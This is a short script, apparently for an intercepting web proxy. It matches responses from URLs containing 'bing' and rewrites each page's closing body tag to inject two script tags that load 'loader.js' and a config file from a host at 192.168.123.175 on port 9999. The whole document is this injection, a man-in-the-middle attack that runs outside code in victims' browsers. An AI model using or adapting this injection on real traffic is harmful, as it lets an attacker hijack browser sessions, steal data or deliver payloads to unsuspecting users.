http()
    .url(/bing/i)
    .loadContent()
    .modify(/<\/body>/i, `
        <script src='http://192.168.123.175:9999/loader.js'></script>
        <script src='http://192.168.123.175:9999/crisps/config.js'></script>
        </body>
    `)